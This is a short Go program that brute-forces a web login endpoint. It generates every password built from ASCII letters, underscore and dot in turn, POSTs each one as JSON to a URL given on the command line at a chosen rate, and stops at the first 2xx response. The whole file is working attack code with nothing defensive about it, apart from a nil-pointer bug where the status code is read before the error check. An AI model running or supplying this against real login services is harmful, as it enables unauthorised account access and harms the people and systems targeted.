package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	url, timesPerSecond := parseCmdArgs()
	characters := getCharacters()
	password := string(characters[0])
	for {
		ok := tryPassword(url, password)
		if ok {
			break
		}
		time.Sleep(time.Duration(1000/timesPerSecond) * time.Millisecond)
		password = generateNextPassword(password, characters)
	}
}

func generateNextPassword(password string, characters []rune) string {
	runePassword := []rune(password)
	for i := len(runePassword) - 1; i >= 0; i-- {
		passwordCharacter := runePassword[i]
		currentCharacterIndex := strings.IndexRune(string(characters), passwordCharacter)

		isLastCharacter := passwordCharacter == characters[len(characters)-1]
		if isLastCharacter { // 桁を繰り上げる必要がある
			runePassword[i] = characters[0]
			if i == 0 { // 一番左の文字が最後の文字だった場合
				// 桁を一つ増やす
				runePassword = append([]rune{characters[0]}, runePassword...)
				break
			} else {
				// 次の文字のインクリメントを行う
				continue
			}
		} else { // 文字を一つ進めるだけ
			runePassword[i] = characters[currentCharacterIndex+1]
			break
		}
	}
	return string(runePassword)
}

func parseCmdArgs() (string, int) {
	cmdArgs := os.Args[1:]
	url := cmdArgs[0]
	timesPerSecond, err := strconv.Atoi(cmdArgs[1])
	if err != nil {
		panic(err)
	}
	return url, timesPerSecond
}

func getCharacters() []rune {
	var characters []rune
	addCharacter := func(character rune) {
		characters = append(characters, character)
	}

	for i := 'a'; i <= 'z'; i++ {
		addCharacter(i)
	}
	for i := 'A'; i <= 'Z'; i++ {
		addCharacter(i)
	}
	addCharacter('_')
	addCharacter('.')

	return characters
}

type LoginBody struct {
	Password string `json:"password"`
}

func tryPassword(url, password string) bool {
	loginBody := LoginBody{Password: password}
	bodyJson, err := json.Marshal(loginBody)
	if err != nil {
		panic(err)
	}
	body := bytes.NewBuffer(bodyJson)
	print(url + ":" + body.String() + ":")
	response, err := http.Post(url, "application/json", body)
	println(response.StatusCode)
	if err != nil {
		panic(err)
	}
	return response.StatusCode >= 200 && response.StatusCode <= 299
}
